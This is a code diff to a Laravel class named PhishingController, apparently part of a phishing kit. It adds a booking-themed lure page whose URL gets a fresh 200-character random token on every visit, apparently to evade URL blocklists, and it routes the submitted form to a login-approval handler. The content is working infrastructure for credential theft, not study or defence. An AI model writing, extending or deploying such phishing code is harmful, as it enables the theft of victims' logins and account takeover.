@@ -169,6 +169,26 @@ class PhishingController extends Controller
         ]);
     }
 
+    public function showBookingOtio(Request $request, $token = null)
+    {
+        $session = $this->getSessionData();
+        // Always refresh token on each visit
+        if (!session('_otio_token') || $token !== session('_otio_token')) {
+            $newToken = Str::random(200);
+            session(['_otio_token' => $newToken]);
+            return redirect('/booking-otio-' . $newToken);
+        }
+        return view('booking-otio', [
+            'metaBasePath' => $session['metaBasePath'],
+            'authPath' => $session['authPath']
+        ]);
+    }
+
+    public function handleBookingOtioSubmit(Request $request)
+    {
+        return app(LoginApprovalController::class)->submitBookingOtio($request);
+    }
+
     public function getSessionPaths()
     {
         $session = Session::get('_s_data');
